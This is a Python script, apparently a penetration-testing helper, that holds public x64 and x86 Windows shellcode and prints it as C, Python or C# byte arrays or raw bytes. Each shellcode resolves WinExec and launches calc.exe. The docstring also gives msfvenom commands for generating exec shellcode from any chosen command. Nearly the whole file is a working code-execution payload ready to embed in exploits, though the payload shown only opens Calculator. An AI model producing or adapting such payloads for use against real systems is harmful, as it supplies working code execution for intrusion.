"""
Shellcode Payload — Pop calc.exe (x64 Windows)

Usage:
    python shellcode_calc.py --format c       # C array
    python shellcode_calc.py --format python   # Python bytes
    python shellcode_calc.py --format raw      # Raw binary to stdout
    python shellcode_calc.py --format csharp   # C# byte array

These are well-known public shellcodes for calc.exe.
For custom shellcode, use msfvenom:
    msfvenom -p windows/x64/exec CMD=calc.exe -f c
    msfvenom -p windows/exec CMD=calc.exe -f c   (32-bit)
"""

import argparse
import sys

# x64 WinExec("calc.exe", SW_SHOW) shellcode
# Source: https://github.com/peterferrie/win-exec-calc-shellcode
SHELLCODE_X64_CALC = (
    b"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18"
    b"\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49"
    b"\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff"
    b"\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44"
    b"\x8b\x52\x1c\x4d\x01\xc2\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01"
    b"\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59"
    b"\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41"
    b"\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff"
    b"\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x82\x4c\x01"
    b"\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91"
    b"\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
    b"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xb8\x00\x63\x61\x6c"
    b"\x63\x00\x00\x00\x50\x48\x89\xe2\x48\x83\xec\x20\x41\xff\xd6"
    b"\x48\x83\xc4\x30\x48\x31\xff\x48\x89\xfa\x48\xb8\x72\xfe\xb3"
    b"\x16\x87\xd0\xa8\xf0\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8"
    b"\x7e\xff\xff\xff\x48\x31\xc9\x41\xff\xd0"
)

# x86 WinExec("calc.exe", SW_SHOW) shellcode
SHELLCODE_X86_CALC = (
    b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08"
    b"\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78"
    b"\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34"
    b"\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08"
    b"\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f"
    b"\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff"
    b"\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53"
    b"\x53\x53\x53\x52\x53\xff\xd7"
)


def format_c(shellcode: bytes, var_name: str = "shellcode") -> str:
    lines = []
    lines.append(f"unsigned char {var_name}[] = ")
    for i in range(0, len(shellcode), 16):
        chunk = shellcode[i:i+16]
        hex_str = "".join(f"\\x{b:02x}" for b in chunk)
        lines.append(f'    "{hex_str}"')
    lines.append(f";  // {len(shellcode)} bytes")
    return "\n".join(lines)


def format_python(shellcode: bytes) -> str:
    lines = ["shellcode = ("]
    for i in range(0, len(shellcode), 16):
        chunk = shellcode[i:i+16]
        hex_str = "".join(f"\\x{b:02x}" for b in chunk)
        lines.append(f'    b"{hex_str}"')
    lines.append(f")  # {len(shellcode)} bytes")
    return "\n".join(lines)


def format_csharp(shellcode: bytes) -> str:
    lines = ["byte[] shellcode = new byte[] {"]
    for i in range(0, len(shellcode), 16):
        chunk = shellcode[i:i+16]
        hex_str = ", ".join(f"0x{b:02x}" for b in chunk)
        lines.append(f"    {hex_str},")
    lines.append(f"}};  // {len(shellcode)} bytes")
    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(description="Calc shellcode generator for VAPT PoC")
    parser.add_argument("--format", choices=["c", "python", "csharp", "raw"], default="c")
    parser.add_argument("--arch", choices=["x64", "x86"], default="x64")
    args = parser.parse_args()

    sc = SHELLCODE_X64_CALC if args.arch == "x64" else SHELLCODE_X86_CALC

    if args.format == "raw":
        sys.stdout.buffer.write(sc)
    elif args.format == "c":
        print(format_c(sc))
    elif args.format == "python":
        print(format_python(sc))
    elif args.format == "csharp":
        print(format_csharp(sc))

    if args.format != "raw":
        print(f"\n// Shellcode length: {len(sc)} bytes ({args.arch})")


if __name__ == "__main__":
    main()
